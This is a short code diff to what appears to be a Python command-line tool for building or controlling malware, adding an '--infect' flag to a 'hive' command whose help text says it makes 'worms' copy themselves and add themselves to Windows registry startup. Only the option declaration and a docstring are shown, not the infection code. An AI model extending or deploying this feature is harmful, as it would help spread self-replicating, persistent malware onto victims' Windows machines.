@@ -84,7 +84,10 @@ class ShellConstructor:
         
         @draco_shell.command()
         @click.argument("name")
+        @click.option("--infect", "-i", is_flag=True, required=False, help="Add cloning function to worms. Copy self and add to registry startup. WORKING ONLY ON WINDOWS !!!")
         def hive(name) -> None:
+            """ **** Welcome To Hive *******\n
+            """
             conf = self.CoCe.sendApi(name, "conf", response=True)
             if not conf:
                 print("ERROR")
